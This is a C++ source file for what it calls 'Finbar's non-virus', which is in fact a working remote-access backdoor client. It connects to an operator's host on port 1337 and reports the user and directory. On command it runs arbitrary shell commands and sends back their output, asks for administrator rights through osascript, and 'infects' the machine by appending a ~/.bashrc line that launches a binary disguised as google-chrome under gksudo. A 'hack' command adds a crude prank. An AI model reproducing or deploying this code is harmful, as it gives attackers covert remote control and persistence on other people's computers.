/*
*** Client side of Finbar's non-virus
*/

#include <stdio.h>
#include <pwd.h>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <errno.h>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <array>
#include <string.h>
#include <string>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include <arpa/inet.h>

#define PORT "1337"

#define MAXDATASIZE 100

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) throw std::runtime_error("popen() failed!");
    while (!feof(pipe.get())) {
        if (fgets(buffer.data(), 128, pipe.get()) != nullptr)
            result += buffer.data();
    }
    return result;
}


bool check(char* one, char* two, int len) {
    for (int i = 0; i < len; ++i) {
	if (one[i] != two[i])
	    return false;
    }
    return true;
}

void *get_in_addr(struct sockaddr *sa)
{
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

int main(int argc, char *argv[])
{
    int sockfd, numbytes;
    char buf[MAXDATASIZE];
    struct addrinfo hints, *servinfo, *p;
    int rv;
    char s[INET6_ADDRSTRLEN];

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if ((rv = getaddrinfo(argv[1], PORT, &hints, &servinfo)) != 0) {
        return 1;
    }

    for(p = servinfo; p != NULL; p = p->ai_next) {
        if ((sockfd = socket(p->ai_family, p->ai_socktype,
                p->ai_protocol)) == -1) {
            continue;
        }

        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            close(sockfd);
            continue; }

        break;
    }

    if (p == NULL) {
        fprintf(stderr, "client: failed to connect\n");
        return 2;
    }

    inet_ntop(p->ai_family, get_in_addr((struct sockaddr *)p->ai_addr),
            s, sizeof s);

    freeaddrinfo(servinfo);

    std::string user = exec("whoami");
    std::string loc = exec("pwd");
    user[user.size()-1] = '\0';
    loc[loc.size()-1] = '\0';
    user = user+" at "+loc;
    send(sockfd, user.c_str(), user.size(), 0);

    while (true) {
        if ((numbytes = recv(sockfd, buf, MAXDATASIZE-1, 0)) == -1) {
            perror("recv");
            exit(1);
    	} else {
            buf[numbytes] = '\0';
            for (int i = 0; i < numbytes; ++i) {
                if (buf[i] == '\n') {
                    buf[i] = '\0';
                    break;
                }

            }

            char *command = buf;
            for (int i = 0; i < numbytes-1; ++i) {
                if (command[i] == ' '){
                    command[i] = '\0';
                    break;
                }
            }

            if (!strcmp(command, "ping")) {
                send(sockfd, "pong\n", 5, 0);
            } else if (!strcmp(command, "-q")) {
                send(sockfd, "next\n", 5, 0);
                close(sockfd);
                return 0;
            } else if (!strcmp(command, "exec")) {
                std::cout << buf << '\n';
                std::string cmd = "";
                for (int i = 5; buf[i] != '\0'; ++i) {
                    cmd += buf[i];
                }
                std::string out = exec(cmd.c_str());
                if (out == "")
                  out = "Command returned no output\n";
                send(sockfd, out.c_str(), out.size(), 0);
            } else if (!strcmp(command, "elevate")) {
                close(sockfd);
                std::string cmd;
                for (int i = 8; buf[i] != '\0'; ++i)
                    cmd += buf[i];
                close(sockfd);
                //cmd = "gksudo ./"+cmd;
                cmd = "/usr/bin/osascript -e 'do shell script \"./"+cmd+"\" with administrator priviliges'";
                std::cout << cmd;
                exec(cmd.c_str());
                return 0;
            } else if (!strcmp(command, "hack")) {
                std::string out = "Hacking.... ";
                send(sockfd, out.c_str(), out.size(), 0);
                for (int i = 1; i <= 100; ++i) {
                    std::string penis = std::to_string(i)+"%\n";
                    send(sockfd, penis.c_str(), penis.size(), 0);
                    usleep((rand() % 500 + 20)*100);
                }
                send(sockfd, "Nudes retreived:\n", 15, 0);
                usleep(1000000);
                std::string line;
                std::ifstream file("pr0n.txt");
                while(getline(file, line)) {
                    line += "\n";
                    send(sockfd, line.c_str(), line.size(), 0);
                    usleep(50000);
                }
            } else if (!strcmp(command, "infect")) {
                char buffer[FILENAME_MAX];
                getcwd(buffer, FILENAME_MAX);
                struct passwd *pw = getpwuid(getuid());
                const char *homedir = pw->pw_dir;
                std::string bashrcloc = std::string(homedir)+"/.bashrc";
                std::string curdir(buffer);
                std::ofstream file(bashrcloc.c_str(),
                                   std::ios_base::app | std::ios_base::out);
                file << "gksudo " << curdir << "/google-chrome &\n";
                close(sockfd);
                exec("gksudo ./google-chrome");
                return 0;
            } else if (!strcmp(command, "help")) {
                std::string outp = "-- help --\nping: ping me\nexec <command>: execute command\nhack: DO NOT RUN!\ninfect: infect the computer\nhelp: show this menu\n\n";
                send(sockfd, outp.c_str(), outp.size(), 0);
            } else {
                std::string out1 = "";
                for (int i = 0; buf[i] != '\0'; ++i) {
                    out1 += buf[i];
                }
                std::string out2 = "Unknown command: "+out1+"\n";
                send(sockfd, out2.c_str(), out2.size(), 0);
            }
        }
    }
}
